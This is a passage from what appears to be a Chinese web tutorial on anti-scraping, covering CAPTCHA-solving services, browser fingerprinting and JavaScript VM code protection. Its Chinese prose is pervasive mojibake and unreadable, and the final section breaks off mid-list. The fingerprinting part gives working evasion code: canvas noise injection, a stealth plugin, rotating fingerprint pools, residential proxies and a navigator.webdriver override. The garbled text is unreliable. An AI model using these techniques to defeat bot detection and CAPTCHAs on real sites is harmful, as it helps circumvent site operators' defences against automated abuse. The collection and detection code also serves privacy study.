<h3>Q3: æ‰“ç å¹³å°å“åº”å¤ªæ…¢ï¼Ÿ</h3>
<p><strong>ä¼˜åŒ–æ–¹æ³•</strong>:</p>
<ul>
<li>ä½¿ç”¨å¼‚æ­¥å¹¶å‘</li>
<li>é¢„å…ˆè¯†åˆ«ç®€å•éªŒè¯ç ï¼Œå¤æ‚çš„æ‰ç”¨æ‰“ç </li>
<li>é€‰æ‹©å“åº”æ›´å¿«çš„å¹³å°ï¼ˆå¦‚æéªŒé€šï¼‰</li>
</ul>
<hr />
<h2>8. å·¥å…·ä¸èµ„æº</h2>
<h3>æ¨èå·¥å…·</h3>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>ç”¨é€”</th>
  <th>é“¾æ¥</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>ddddocr</strong></td>
  <td>ä¸­æ–‡éªŒè¯ç  OCR</td>
  <td>https://github.com/sml2h3/ddddocr</td>
</tr>
<tr>
  <td><strong>YOLOv8</strong></td>
  <td>ç›®æ ‡æ£€æµ‹</td>
  <td>https://github.com/ultralytics/ultralytics</td>
</tr>
<tr>
  <td><strong>ghost-cursor</strong></td>
  <td>è‡ªç„¶é¼ æ ‡è½¨è¿¹</td>
  <td>https://github.com/Xetera/ghost-cursor</td>
</tr>
<tr>
  <td><strong>2Captcha</strong></td>
  <td>å•†ä¸šæ‰“ç å¹³å°</td>
  <td>https://2captcha.com/</td>
</tr>
<tr>
  <td><strong>hcaptcha-solver</strong></td>
  <td>hCaptcha è‡ªåŠ¨æ±‚è§£</td>
  <td>https://github.com/QIN2DIM/hcaptcha-challenger</td>
</tr>
</tbody>
</table>
<hr />
<h2>9. æ€»ç»“</h2>
<p>éªŒè¯ç å¯¹æŠ—æ˜¯ä¸€åœº<strong>æ°¸æ’çš„çŒ«é¼ æ¸¸æˆ</strong>ã€‚æŠ€æœ¯è·¯çº¿é€‰æ‹©å–å†³äºï¼š</p>
<ul>
<li><strong>ä¸ªäººå­¦ä¹ </strong>: æ‰‹åŠ¨è¯†åˆ« + è½¨è¿¹æ¨¡æ‹Ÿï¼ˆddddocr + è´å¡å°”æ›²çº¿ï¼‰</li>
<li><strong>å°è§„æ¨¡çˆ¬è™«</strong>: æ‰“ç å¹³å°ï¼ˆ2Captchaã€è¶…çº§é¹°ï¼‰</li>
<li><strong>å¤§è§„æ¨¡å•†ä¸š</strong>: æ·±åº¦å­¦ä¹  + è¡Œä¸ºä¼ªé€  + åˆ†å¸ƒå¼æ¶æ„</li>
<li><strong>ç»ˆææ–¹æ¡ˆ</strong>: çœŸå®è®¾å¤‡ + çœŸå®ç”¨æˆ·è¡Œä¸º + æŒ‡çº¹ä¼ªé€ </li>
</ul>
<p><strong>æ ¸å¿ƒåŸåˆ™</strong>:</p>
<ol>
<li><strong>æˆæœ¬ä¼˜å…ˆ</strong>: é€‰æ‹©æ€§ä»·æ¯”æœ€é«˜çš„æ–¹æ¡ˆ</li>
<li><strong>ç¨³å®šæ€§ä¼˜å…ˆ</strong>: ç‰ºç‰²ä¸€å®šé€Ÿåº¦æ¢å–æˆåŠŸç‡</li>
<li><strong>åˆæ³•åˆè§„</strong>: éµå®ˆç›®æ ‡ç½‘ç«™çš„æœåŠ¡æ¡æ¬¾</li>
<li><strong>æŒç»­ä¼˜åŒ–</strong>: éªŒè¯ç åœ¨å‡çº§ï¼Œæ–¹æ¡ˆä¹Ÿè¦è¿­ä»£</li>
</ol>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-60">æµè§ˆå™¨è‡ªåŠ¨åŒ–è„šæœ¬</a></li>
<li><a href="#section-34">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-20">Puppeteer ä¸ Playwright</a></li>
<li><a href="#section-30">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-34">
                                                <h2>[R33] Browser Fingerprinting</h2>
                                                <h1>R33: æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</h1>
<h2>æ¦‚è¿°</h2>
<p>æµè§ˆå™¨æŒ‡çº¹ï¼ˆBrowser Fingerprintingï¼‰æ˜¯ä¸€ç§é€šè¿‡æ”¶é›†æµè§ˆå™¨å’Œè®¾å¤‡çš„å„ç§ç‰¹å¾æ¥å”¯ä¸€æ ‡è¯†ç”¨æˆ·çš„æŠ€æœ¯ã€‚å³ä½¿ç”¨æˆ·æ¸…é™¤ Cookie æˆ–ä½¿ç”¨éšèº«æ¨¡å¼ï¼Œä»ç„¶å¯ä»¥é€šè¿‡æŒ‡çº¹è¿½è¸ªã€‚</p>
<hr />
<h2>æŒ‡çº¹ç»„æˆè¦ç´ </h2>
<h3>1. User-Agent</h3>
<p>æœ€åŸºç¡€çš„æŒ‡çº¹ä¿¡æ¯ï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿã€æµè§ˆå™¨ç‰ˆæœ¬ç­‰ï¼š</p>
<pre><code class="language-javascript">navigator.userAgent;
// &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...&quot;
</code></pre>
<h3>2. Screen ä¿¡æ¯</h3>
<pre><code class="language-javascript">const screenInfo = {
  width: screen.width,
  height: screen.height,
  colorDepth: screen.colorDepth,
  pixelDepth: screen.pixelDepth,
  availWidth: screen.availWidth,
  availHeight: screen.availHeight,
};
</code></pre>
<h3>3. æ—¶åŒºä¸è¯­è¨€</h3>
<pre><code class="language-javascript">const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; // &quot;Asia/Shanghai&quot;
const language = navigator.language; // &quot;zh-CN&quot;
const languages = navigator.languages; // [&quot;zh-CN&quot;, &quot;zh&quot;, &quot;en&quot;]
</code></pre>
<h3>4. æ’ä»¶åˆ—è¡¨</h3>
<pre><code class="language-javascript">const plugins = Array.from(navigator.plugins).map((p) =&gt; p.name);
// [&quot;Chrome PDF Plugin&quot;, &quot;Chrome PDF Viewer&quot;, ...]
</code></pre>
<p><strong>æ³¨æ„</strong>: ç°ä»£æµè§ˆå™¨å‡ºäºéšç§è€ƒè™‘ï¼Œå·²é™åˆ¶å¯¹æ’ä»¶åˆ—è¡¨çš„è®¿é—®ã€‚</p>
<h3>5. Canvas æŒ‡çº¹</h3>
<p>é€šè¿‡ Canvas æ¸²æŸ“å·®å¼‚ç”ŸæˆæŒ‡çº¹ï¼ˆè¯¦è§ <a href="#section-41">Canvas æŒ‡çº¹æŠ€æœ¯</a>ï¼‰ï¼š</p>
<pre><code class="language-javascript">function getCanvasFingerprint() {
  const canvas = document.createElement(&quot;canvas&quot;);
  const ctx = canvas.getContext(&quot;2d&quot;);
  ctx.textBaseline = &quot;top&quot;;
  ctx.font = &quot;14px Arial&quot;;
  ctx.fillText(&quot;fingerprint&quot;, 2, 2);
  return canvas.toDataURL();
}
</code></pre>
<h3>6. WebGL æŒ‡çº¹</h3>
<pre><code class="language-javascript">function getWebGLFingerprint() {
  const canvas = document.createElement(&quot;canvas&quot;);
  const gl =
    canvas.getContext(&quot;webgl&quot;) || canvas.getContext(&quot;experimental-webgl&quot;);

  const debugInfo = gl.getExtension(&quot;WEBGL_debug_renderer_info&quot;);
  const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
  const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

  return { vendor, renderer };
}
</code></pre>
<h3>7. éŸ³é¢‘æŒ‡çº¹ (AudioContext)</h3>
<pre><code class="language-javascript">function getAudioFingerprint() {
  const audioContext = new (window.AudioContext || window.webkitAudioContext)();
  const oscillator = audioContext.createOscillator();
  const analyser = audioContext.createAnalyser();
  const gainNode = audioContext.createGain();
  const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);

  // é€šè¿‡éŸ³é¢‘å¤„ç†çš„ç»†å¾®å·®å¼‚ç”ŸæˆæŒ‡çº¹
  // ... å¤æ‚çš„éŸ³é¢‘å¤„ç†é€»è¾‘
}
</code></pre>
<h3>8. å­—ä½“æ£€æµ‹</h3>
<pre><code class="language-javascript">function detectFonts() {
  const baseFonts = [&quot;monospace&quot;, &quot;sans-serif&quot;, &quot;serif&quot;];
  const testFonts = [
    &quot;Arial&quot;,
    &quot;Verdana&quot;,
    &quot;Times New Roman&quot;,
    &quot;Courier&quot;,
    &quot;Comic Sans MS&quot;,
  ];

  const detectedFonts = [];

  testFonts.forEach((font) =&gt; {
    // é€šè¿‡æµ‹é‡æ–‡æœ¬å®½åº¦çš„å˜åŒ–æ¥æ£€æµ‹å­—ä½“æ˜¯å¦å­˜åœ¨
    // ... å®ç°é€»è¾‘
  });

  return detectedFonts;
}
</code></pre>
<h3>9. ç¡¬ä»¶ä¿¡æ¯</h3>
<pre><code class="language-javascript">const hardwareInfo = {
  cpuCores: navigator.hardwareConcurrency, // CPU æ ¸å¿ƒæ•°
  deviceMemory: navigator.deviceMemory, // è®¾å¤‡å†…å­˜ï¼ˆGBï¼‰
  platform: navigator.platform, // &quot;Win32&quot;, &quot;MacIntel&quot;
  vendor: navigator.vendor, // &quot;Google Inc.&quot;
};
</code></pre>
<hr />
<h2>æŒ‡çº¹åº“ä½¿ç”¨</h2>
<h3>FingerprintJS</h3>
<p>æœ€æµè¡Œçš„å¼€æºæŒ‡çº¹åº“ï¼š</p>
<pre><code class="language-javascript">// å®‰è£…ï¼šnpm install @fingerprintjs/fingerprintjs

import FingerprintJS from &quot;@fingerprintjs/fingerprintjs&quot;;

// åˆå§‹åŒ–
const fpPromise = FingerprintJS.load();

// è·å–æŒ‡çº¹
fpPromise
  .then((fp) =&gt; fp.get())
  .then((result) =&gt; {
    console.log(&quot;Visitor ID:&quot;, result.visitorId);
    console.log(&quot;Components:&quot;, result.components);
  });
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>:</p>
<ul>
<li>å‡†ç¡®ç‡é«˜ï¼ˆ99.5%ï¼‰</li>
<li>æŒä¹…æ€§å¼º</li>
<li>å¼€æºå…è´¹</li>
</ul>
<hr />
<h2>æ£€æµ‹æŒ‡çº¹é‡‡é›†</h2>
<h3>æ–¹æ³•ä¸€ï¼šç›‘æ§ API è°ƒç”¨</h3>
<pre><code class="language-javascript">// Hook Canvas API
const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
HTMLCanvasElement.prototype.toDataURL = function () {
  console.log(&quot;[Fingerprint] Canvas fingerprinting detected!&quot;);
  console.trace();
  return originalToDataURL.apply(this, arguments);
};

// Hook WebGL
const originalGetParameter = WebGLRenderingContext.prototype.getParameter;
WebGLRenderingContext.prototype.getParameter = function (param) {
  console.log(&quot;[Fingerprint] WebGL fingerprinting detected!&quot;, param);
  return originalGetParameter.apply(this, arguments);
};
</code></pre>
<h3>æ–¹æ³•äºŒï¼šæ£€æŸ¥ç¬¬ä¸‰æ–¹è„šæœ¬</h3>
<p>åœ¨ DevTools -&gt; Sources ä¸­æœç´¢å…³é”®è¯ï¼š</p>
<ul>
<li><code>fingerprint</code></li>
<li><code>FingerprintJS</code></li>
<li><code>canvas.toDataURL</code></li>
<li><code>WEBGL_debug_renderer_info</code></li>
</ul>
<hr />
<h2>åæŒ‡çº¹æŠ€æœ¯</h2>
<h3>1. ä½¿ç”¨æµè§ˆå™¨æ’ä»¶</h3>
<p><strong>æ¨èæ’ä»¶</strong>:</p>
<ul>
<li><strong>Canvas Blocker</strong> (Firefox/Chrome): é˜»æ­¢ Canvas æŒ‡çº¹</li>
<li><strong>Privacy Badger</strong>: é˜»æ­¢è¿½è¸ªå™¨</li>
<li><strong>uBlock Origin</strong>: é˜»æ­¢å¹¿å‘Šå’Œè¿½è¸ª</li>
</ul>
<h3>2. ä¿®æ”¹ User-Agent</h3>
<pre><code class="language-javascript">// Puppeteer
await page.setUserAgent(&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...&quot;);

// Selenium
options.add_argument(&quot;user-agent=Mozilla/5.0...&quot;);
</code></pre>
<h3>3. ä¼ªé€  Canvas/WebGL</h3>
<pre><code class="language-javascript">// æ³¨å…¥å™ªç‚¹åˆ° Canvas
const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
HTMLCanvasElement.prototype.toDataURL = function () {
  // æ·»åŠ éšæœºå™ªç‚¹
  const ctx = this.getContext(&quot;2d&quot;);
  const imageData = ctx.getImageData(0, 0, this.width, this.height);
  for (let i = 0; i &lt; imageData.data.length; i += 4) {
    if (Math.random() &lt; 0.001) {
      imageData.data[i] = Math.floor(Math.random() * 256);
    }
  }
  ctx.putImageData(imageData, 0, 0);
  return originalToDataURL.apply(this, arguments);
};
</code></pre>
<h3>4. ä½¿ç”¨æŒ‡çº¹ä¼ªé€ åº“</h3>
<p><strong>Puppeteer Stealth Plugin</strong>:</p>
<pre><code class="language-javascript">const puppeteer = require(&quot;puppeteer-extra&quot;);
const StealthPlugin = require(&quot;puppeteer-extra-plugin-stealth&quot;);

puppeteer.use(StealthPlugin());

const browser = await puppeteer.launch();
</code></pre>
<h3>5. ç»Ÿä¸€ç¯å¢ƒç‰¹å¾</h3>
<p>ç¡®ä¿æ‰€æœ‰è¯·æ±‚ä½¿ç”¨ç›¸åŒçš„ï¼š</p>
<ul>
<li>User-Agent</li>
<li>Screen åˆ†è¾¨ç‡</li>
<li>æ—¶åŒºå’Œè¯­è¨€</li>
<li>Canvas/WebGL è¾“å‡º</li>
</ul>
<hr />
<h2>ç»•è¿‡ç­–ç•¥</h2>
<h3>ç­–ç•¥ä¸€ï¼šä½¿ç”¨çœŸå®æµè§ˆå™¨</h3>
<p>Puppeteer/Playwright æ§åˆ¶çœŸå®æµè§ˆå™¨ï¼Œå¤©ç„¶å…·æœ‰å®Œæ•´æŒ‡çº¹ã€‚</p>
<h3>ç­–ç•¥äºŒï¼šæŒ‡çº¹æ± </h3>
<p>ç»´æŠ¤å¤šä¸ªä¸åŒçš„æŒ‡çº¹é…ç½®ï¼Œè½®æ¢ä½¿ç”¨ï¼š</p>
<pre><code class="language-python">FINGERPRINT_POOL = [
    {
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
        'screen': {'width': 1920, 'height': 1080},
        'timezone': 'America/New_York',
        'language': 'en-US'
    },
    {
        'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) ...',
        'screen': {'width': 1440, 'height': 900},
        'timezone': 'America/Los_Angeles',
        'language': 'en-US'
    }
]

# éšæœºé€‰æ‹©ä¸€ä¸ªæŒ‡çº¹
fingerprint = random.choice(FINGERPRINT_POOL)
</code></pre>
<h3>ç­–ç•¥ä¸‰ï¼šä½å®…ä»£ç†</h3>
<p>é«˜è´¨é‡ä½å®…ä»£ç†é€šå¸¸è‡ªå¸¦çœŸå®ç”¨æˆ·çš„å®Œæ•´æŒ‡çº¹ã€‚</p>
<hr />
<h2>æµ‹è¯•å·¥å…·</h2>
<h3>åœ¨çº¿æµ‹è¯•</h3>
<ul>
<li><a href="https://amiunique.org/">AmIUnique</a> - æŒ‡çº¹å”¯ä¸€æ€§æµ‹è¯•</li>
<li><a href="https://browserleaks.com/">BrowserLeaks</a> - å…¨é¢çš„æµè§ˆå™¨ä¿¡æ¯æ³„éœ²æ£€æµ‹</li>
<li><a href="https://coveryourtracks.eff.org/">Cover Your Tracks</a> - EFF çš„éšç§æµ‹è¯•</li>
<li><a href="https://fingerprint.com/demo/">Fingerprint.com Demo</a> - FingerprintJS æ¼”ç¤º</li>
</ul>
<h3>å‘½ä»¤è¡Œæµ‹è¯•</h3>
<pre><code class="language-bash"># ä½¿ç”¨ curl æµ‹è¯• TLS æŒ‡çº¹
curl --user-agent &quot;Mozilla/5.0...&quot; https://tls.peet.ws/api/clean
</code></pre>
<hr />
<h2>å®æˆ˜æ¡ˆä¾‹</h2>
<h3>æ¡ˆä¾‹ï¼šæŸç¤¾äº¤ç½‘ç«™æ£€æµ‹</h3>
<p><strong>ç°è±¡</strong>: Python requests è®¿é—®è¿”å›ç©ºæ•°æ®ï¼Œæµè§ˆå™¨æ­£å¸¸ã€‚</p>
<p><strong>åˆ†ææ­¥éª¤</strong>:</p>
<ol>
<li>å¯¹æ¯”è¯·æ±‚å¤´ - å·²ä¼ªé€ ï¼Œä»å¤±è´¥</li>
<li>æ£€æŸ¥ Cookie - å·²æºå¸¦ï¼Œä»å¤±è´¥</li>
<li>æ€€ç–‘æŒ‡çº¹æ£€æµ‹</li>
</ol>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.chrome.options import Options

options = Options()
options.add_argument('--disable-blink-features=AutomationControlled')
options.add_experimental_option('excludeSwitches', ['enable-automation'])
options.add_experimental_option('useAutomationExtension', False)

driver = webdriver.Chrome(options=options)

# ä¿®æ”¹ navigator.webdriver
driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
    'source': '''
        Object.defineProperty(navigator, 'webdriver', {
            get: () =&gt; undefined
        })
    '''
})

driver.get('https://target.com')
</code></pre>
<hr />
<h2>æ€»ç»“</h2>
<p>æµè§ˆå™¨æŒ‡çº¹æ˜¯ç°ä»£åçˆ¬è™«çš„æ ¸å¿ƒæŠ€æœ¯ä¹‹ä¸€ã€‚å¯¹æŠ—ç­–ç•¥ï¼š</p>
<ol>
<li>ä½¿ç”¨çœŸå®æµè§ˆå™¨ï¼ˆPuppeteer/Seleniumï¼‰</li>
<li>å®‰è£…åæŒ‡çº¹æ’ä»¶</li>
<li>ä¼ªé€ æŒ‡çº¹ä¿¡æ¯</li>
<li>ä½¿ç”¨æŒ‡çº¹æ± è½®æ¢</li>
<li>é‡‡ç”¨ä½å®…ä»£ç†</li>
</ol>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-41">Canvas æŒ‡çº¹æŠ€æœ¯</a></li>
<li><a href="#section-42">TLS æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-37">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-35">
                                                <h2>[R34] JavaScript VM Protection</h2>
                                                <h1>R34: JavaScript è™šæ‹Ÿæœºä¿æŠ¤</h1>
<h2>æ¦‚è¿°</h2>
<p>JavaScript è™šæ‹Ÿæœºä¿æŠ¤ï¼ˆJSVMP, Virtual Machine based code Protection for JavaScriptï¼‰æ˜¯ä¸€ç§é«˜çº§çš„å‰ç«¯ä»£ç ä¿æŠ¤æŠ€æœ¯ï¼Œé€šè¿‡å°† JavaScript æºä»£ç è½¬æ¢ä¸ºè‡ªå®šä¹‰å­—èŠ‚ç ï¼Œå¹¶ä½¿ç”¨ä¸“é—¨çš„è§£é‡Šå™¨æ‰§è¡Œï¼Œä»è€Œæœ‰æ•ˆéšè—åŸå§‹ä¸šåŠ¡é€»è¾‘ï¼Œå¢åŠ é€†å‘åˆ†æéš¾åº¦ã€‚</p>
<p>JSVMP æ¦‚å¿µæœ€æ—©ç”±è¥¿åŒ—å¤§å­¦ 2015 çº§ç¡•å£«ç ”ç©¶ç”ŸåŒ¡å‡¯å…ƒåœ¨å…¶ 2018 å¹´çš„è®ºæ–‡ã€ŠåŸºäº WebAssembly çš„ JavaScript ä»£ç è™šæ‹ŸåŒ–ä¿æŠ¤æ–¹æ³•ç ”ç©¶ä¸å®ç°ã€‹ä¸­æå‡ºã€‚</p>
<hr />
<h2>åŸºç¡€æ¦‚å¿µ</h2>
<h3>å®šä¹‰</h3>
<p>JSVMPï¼ˆJavaScript Virtual Machine Protectionï¼‰æ˜¯ä¸€ç§ JavaScript ä»£ç è™šæ‹ŸåŒ–ä¿æŠ¤æ–¹æ¡ˆã€‚å…¶æ ¸å¿ƒæ€æƒ³æ˜¯å°†ä»£ç è™šæ‹ŸåŒ–å¼•å…¥ JavaScript ä»£ç ä¿æŠ¤ä¸­ï¼Œå°†ç›®æ ‡ JS ä»£ç è½¬æ¢ä¸ºåªæœ‰ç‰¹æ®Šè§£é‡Šå™¨æ‰èƒ½è¯†åˆ«çš„è‡ªå®šä¹‰å­—èŠ‚ç ï¼Œéšè—ç›®æ ‡ä»£ç çš„å…³é”®é€»è¾‘ã€‚</p>
<p>ä¸ä¼ ç»Ÿçš„æ··æ·†ã€åŠ å¯†ç­‰ä¿æŠ¤æ–¹å¼ä¸åŒï¼ŒJSVMP é€šè¿‡è™šæ‹ŸåŒ–æŠ€æœ¯ä»æ ¹æœ¬ä¸Šæ”¹å˜äº†ä»£ç çš„æ‰§è¡Œæ–¹å¼ã€‚</p>
<h3>æ ¸å¿ƒåŸç†</h3>
<p>JSVMP çš„å·¥ä½œæµç¨‹åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªå…³é”®æ­¥éª¤ï¼š</p>
<ol>
<li><strong>è¯æ³•åˆ†æ â†’ è¯­æ³•åˆ†æ â†’ AST ç”Ÿæˆ</strong>ï¼šè§£æåŸå§‹ JavaScript ä»£ç ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘</li>
<li><strong>ç§æœ‰æŒ‡ä»¤ç”Ÿæˆ</strong>ï¼šåŸºäº AST å®ç°ä¸åŒçš„è™šæ‹ŸåŒ–ç­–ç•¥ï¼Œå°†é«˜çº§è¯­æ³•æ‹†åˆ†ä¸ºå…·æœ‰åŸå­æ“ä½œç‰¹æ€§çš„ä¸­é—´ä»£ç </li>
<li><strong>å­—èŠ‚ç ç¼–ç </strong>ï¼šå°†ä¸­é—´ä»£ç æ˜ å°„åˆ°è™šæ‹ŸæŒ‡ä»¤å¹¶ç¼–ç æˆå­—èŠ‚ç </li>
<li><strong>ç§æœ‰è§£é‡Šå™¨ç”Ÿæˆ</strong>ï¼šç”Ÿæˆèƒ½å¤Ÿæ‰§è¡Œè‡ªå®šä¹‰å­—èŠ‚ç çš„è™šæ‹Ÿæœºè§£é‡Šå™¨</li>
</ol>
<p>æ•´ä¸ªè¿‡ç¨‹å°†åŸå§‹ä»£ç è½¬æ¢ä¸ºå¤±å»æ–‡æœ¬è¯­æ³•å±æ€§çš„å­—èŠ‚ç ï¼Œä½¿å¾—é€†å‘åˆ†æå˜å¾—æå…¶å›°éš¾ã€‚</p>
<hr />
<h2>è¯¦ç»†å†…å®¹</h2>
<h3>è™šæ‹Ÿæœºæ¶æ„</h3>
<p>JSVMP çš„ä¿æŠ¤ç»“æ„ä¸»è¦ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p>
<pre><code class="language-mermaid">graph TB
    subgraph Source[&quot;åŸå§‹ JavaScript ä»£ç &quot;]
        JS[JavaScript æºä»£ç &lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;function encrypt(data) {&lt;br/&gt;  return hash(data);&lt;br/&gt;}]
    end

    subgraph Compiler[&quot;ç¼–è¯‘é˜¶æ®µï¼ˆç¦»çº¿ï¼‰&quot;]
        Lexer[è¯æ³•åˆ†æå™¨&lt;br/&gt;Tokenizer]
        Parser[è¯­æ³•åˆ†æå™¨&lt;br/&gt;Parser]
        AST[æŠ½è±¡è¯­æ³•æ ‘&lt;br/&gt;AST]
        IRGen[ä¸­é—´ä»£ç ç”Ÿæˆ&lt;br/&gt;IR Generator]
        BytecodeGen[å­—èŠ‚ç ç”Ÿæˆ&lt;br/&gt;Bytecode Generator]

        JS --&gt; Lexer --&gt; Parser --&gt; AST
        AST --&gt; IRGen
        IRGen --&gt; BytecodeGen
    end

    subgraph Output[&quot;è¾“å‡ºäº§ç‰©&quot;]
        Bytecode[è‡ªå®šä¹‰å­—èŠ‚ç &lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;0x01 0x42 0x3A ...&lt;br/&gt;æ“ä½œç åºåˆ—]

        ConstPool[å¸¸é‡æ± &lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ æ•°å­—å¸¸é‡&lt;br/&gt;â€¢ å­—ç¬¦ä¸²è¡¨&lt;br/&gt;â€¢ å‡½æ•°å¼•ç”¨]

        VMCode[VM è§£é‡Šå™¨&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ WebAssembly&lt;br/&gt;â€¢ æ··æ·†çš„ JS]
    end

    BytecodeGen --&gt; Bytecode
    BytecodeGen --&gt; ConstPool
    BytecodeGen --&gt; VMCode

    subgraph Runtime[&quot;è¿è¡Œæ—¶æ‰§è¡Œ&quot;]
        VMInit[VM åˆå§‹åŒ–&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ åˆ›å»ºä¸Šä¸‹æ–‡&lt;br/&gt;â€¢ åŠ è½½å­—èŠ‚ç &lt;br/&gt;â€¢ åˆå§‹åŒ–å¸¸é‡æ± ]

        VMContext[VM ä¸Šä¸‹æ–‡&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è™šæ‹Ÿæ ˆ&lt;br/&gt;â€¢ å±€éƒ¨å˜é‡è¡¨&lt;br/&gt;â€¢ PC å¯„å­˜å™¨]

        Dispatcher[æŒ‡ä»¤åˆ†å‘å™¨&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è¯»å–æ“ä½œç &lt;br/&gt;â€¢ è·¯ç”±åˆ° Handler]

        Handlers[æŒ‡ä»¤å¤„ç†å™¨é›†åˆ&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ Handler_PUSH&lt;br/&gt;â€¢ Handler_ADD&lt;br/&gt;â€¢ Handler_CALL&lt;br/&gt;â€¢ Handler_JMP&lt;br/&gt;â€¢ ...]

        VMExit[VM é€€å‡º&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è¿”å›ç»“æœ&lt;br/&gt;â€¢ æ¸…ç†èµ„æº]

        VMInit --&gt; VMContext
        VMContext --&gt; Dispatcher
        Dispatcher --&gt; Handlers
        Handlers --&gt; Dispatcher
        Dispatcher --&gt; VMExit
    end

    Bytecode -.åŠ è½½.-&gt; VMInit
    ConstPool -.åŠ è½½.-&gt; VMInit
    VMCode -.æ‰§è¡Œ.-&gt; Runtime

    style JS fill:#e1f5ff
    style Bytecode fill:#f5a623
    style VMCode fill:#bd10e0
    style Dispatcher fill:#4a90e2
</code></pre>
<p><strong>æ¶æ„ç»„æˆéƒ¨åˆ†</strong>:</p>
<ol>
<li><p><strong>è™šæ‹ŸæŒ‡ä»¤é›†ï¼ˆBytecodeï¼‰</strong></p>
<ul>
<li>è‡ªå®šä¹‰çš„æ“ä½œç é›†åˆ</li>
<li>ç¼–ç åçš„æŒ‡ä»¤åºåˆ—</li>
<li>å¸¸é‡æ± å’Œå­—ç¬¦ä¸²è¡¨</li>
</ul>
</li>
<li><p><strong>è™šæ‹Ÿè§£é‡Šå™¨ï¼ˆVM Interpreterï¼‰</strong></p>
<ul>
<li><strong>VMContext</strong>ï¼šè™šæ‹Ÿæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œç»´æŠ¤æ‰§è¡ŒçŠ¶æ€</li>
<li><strong>VMInit</strong>ï¼šåˆå§‹åŒ–æ¨¡å—ï¼Œè®¾ç½®è™šæ‹Ÿæœºç¯å¢ƒ</li>
<li><strong>Dispatcher</strong>ï¼šè°ƒåº¦å™¨ï¼Œè´Ÿè´£æŒ‡ä»¤åˆ†å‘</li>
<li><strong>Handler</strong>ï¼šå­—èŠ‚ç å¤„ç†å™¨ï¼Œæ‰§è¡Œå…·ä½“æŒ‡ä»¤</li>
<li><strong>VMExit</strong>ï¼šé€€å‡ºæ¨¡å—ï¼Œæ¸…ç†è™šæ‹ŸæœºçŠ¶æ€</li>
</ul>
</li>
</ol>
<h3>åŸºäº WebAssembly çš„å®ç°</h3>
<p>ä¸ºäº†è¿›ä¸€æ­¥å¢å¼ºä¿æŠ¤å¼ºåº¦ï¼Œç°ä»£ JSVMP è§£é‡Šå™¨é€šå¸¸åŸºäº WebAssembly å®ç°ï¼š</p>
<ul>
<li>æ ¸å¿ƒé€»è¾‘ä½¿ç”¨ C/C++ ç¼–å†™</li>
<li>é€šè¿‡ Emscripten æ¡†æ¶ç¼–è¯‘ä¸º WebAssembly äºŒè¿›åˆ¶æ ¼å¼</li>
<li>åœ¨æµè§ˆå™¨ä¸­æ— æ³•ç›´æ¥è¯»å–æºä»£ç </li>
<li>æ‰§è¡Œæ€§èƒ½ä¼˜äºçº¯ JavaScript å®ç°</li>
</ul>
<h3>ä»£ç è™šæ‹ŸåŒ–ç­–ç•¥</h3>
<p>é’ˆå¯¹ä¸åŒç±»å‹çš„ç›®æ ‡ä»£ç ï¼ŒJSVMP å®ç°äº†ä¸åŒçš„è™šæ‹ŸåŒ–ç­–ç•¥ï¼š</p>
<ol>
<li><p><strong>æŒ‡ä»¤æ‹†åˆ†</strong></p>
<ul>
<li>å°† JavaScript ä»£ç è½¬æ¢ä¸ºå…·æœ‰åŸå­æ“ä½œç‰¹æ€§çš„ä¸­é—´ä»£ç </li>
<li>æ¨¡æ‹Ÿæœ¬åœ°æ‰§è¡Œç¯å¢ƒ</li>
</ul>
</li>
<li><p><strong>è‡ªå®šä¹‰è™šæ‹ŸæŒ‡ä»¤é›†</strong></p>
<ul>
<li>å°†ä¸­é—´ä»£ç æ˜ å°„åˆ°è™šæ‹ŸæŒ‡ä»¤</li>
<li>ç¼–ç ä¸ºè‡ªå®šä¹‰å­—èŠ‚ç æ ¼å¼</li>
</ul>
</li>
<li><p><strong>å­—ç¬¦ä¸²å’Œå±æ€§æ›¿æ¢</strong></p>
<ul>
<li>å°†å±æ€§åå’Œå­—ç¬¦ä¸²æ›¿æ¢ä¸ºæ•°ç»„å…ƒç´ ç´¢å¼•</li>
